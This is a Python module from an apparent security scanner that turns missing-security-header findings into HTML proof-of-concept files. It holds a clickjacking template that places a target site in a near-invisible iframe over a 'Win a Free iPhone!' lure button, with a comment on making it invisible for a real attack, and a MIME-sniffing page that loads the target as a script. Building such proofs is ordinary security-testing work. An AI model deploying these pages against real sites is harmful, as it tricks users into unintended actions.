"""
cyberm4fia-scanner - Automated PoC (Proof of Concept) Generator

Generates automated HTML/JS PoC files for identified vulnerabilities.
Specializes in creating offensive materials to prove the impact of Missing Security Headers (e.g. Clickjacking, MIME Sniffing).
"""

import os
from urllib.parse import urlparse
from utils.colors import log_success, log_info


def generate_pocs(findings: list, scan_dir: str):
    """Analyze findings and generate relevant PoC files."""
    poc_dir = os.path.join(scan_dir, "pocs")
    
    clickjacking_targets = set()
    mime_sniffing_targets = set()

    # Identify targets that are missing specific headers
    for f in findings:
        if f.get("type") == "Missing_Security_Header":
            header = f.get("param", "").lower()
            url = f.get("url", "")
            if header in ["x-frame-options", "content-security-policy"]:
                clickjacking_targets.add(url)
            elif header == "x-content-type-options":
                mime_sniffing_targets.add(url)

    if not clickjacking_targets and not mime_sniffing_targets:
        return

    os.makedirs(poc_dir, exist_ok=True)
    log_info(f"Generating Offline PoC Exploits in {poc_dir}...")

    # 1. Clickjacking PoC Generator
    for url in clickjacking_targets:
        parsed = urlparse(url)
        safe_name = parsed.netloc.replace(":", "_")
        filename = os.path.join(poc_dir, f"clickjacking_{safe_name}.html")
        _create_clickjacking_poc(url, filename)

    # 2. MIME Sniffing PoC Generator
    for url in mime_sniffing_targets:
        parsed = urlparse(url)
        safe_name = parsed.netloc.replace(":", "_")
        filename = os.path.join(poc_dir, f"mime_sniffing_{safe_name}.html")
        _create_mime_poc(url, filename)


def _create_clickjacking_poc(url: str, filepath: str):
    """Generate a Clickjacking HTML PoC."""
    poc_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - {url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; margin-top: 50px; }}
        .header {{ background: #ff4757; color: white; padding: 20px; border-radius: 8px; display: inline-block; }}
        .iframe-container {{ position: relative; width: 800px; height: 600px; margin: 20px auto; border: 2px dashed #333; }}
        iframe {{ width: 100%; height: 100%; opacity: 0.5; /* Set to 0.001 in real attack */ z-index: 2; position: absolute; top:0; left:0; border: none; }}
        .victim-button {{ position: absolute; top: 300px; left: 350px; z-index: 1; padding: 15px 30px; font-size: 18px; background: #2ed573; color: white; border: none; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Clickjacking Vulnerability Proof of Concept</h1>
        <p>Target: <strong>{url}</strong></p>
        <p>Because X-Frame-Options or CSP frame-ancestors is missing, this site can be framed.</p>
    </div>
    
    <div class="iframe-container">
        <!-- The malicious background button the user THINKS they are clicking -->
        <button class="victim-button">Win a Free iPhone!</button>
        
        <!-- The invisible target framed over the button -->
        <iframe src="{url}"></iframe>
    </div>
</body>
</html>"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(poc_content)
    log_success(f"[PoC] Generated Clickjacking proof: {os.path.basename(filepath)}")


def _create_mime_poc(url: str, filepath: str):
    """Generate a MIME Sniffing HTML PoC."""
    poc_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>MIME Sniffing PoC - {url}</title>
</head>
<body>
    <h2>MIME Sniffing (X-Content-Type-Options) Proof of Concept</h2>
    <p>Target: <strong>{url}</strong></p>
    <p>The target does not enforce the 'nosniff' directive. If a user uploads a profile picture containing JavaScript disguised as an image, the browser might execute it.</p>
    
    <hr>
    <h3>Simulated Execution:</h3>
    <!-- The browser will attempt to guess the content type of the target URL. -->
    <!-- If the target returns user-controlled content without proper content-type, it will execute as script -->
    <script src="{url}"></script>
    <p><i>If an alert popped up or the console executed scripts from the URL above, the exploit is successful.</i></p>
</body>
</html>"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(poc_content)
    log_success(f"[PoC] Generated MIME Sniffing proof: {os.path.basename(filepath)}")
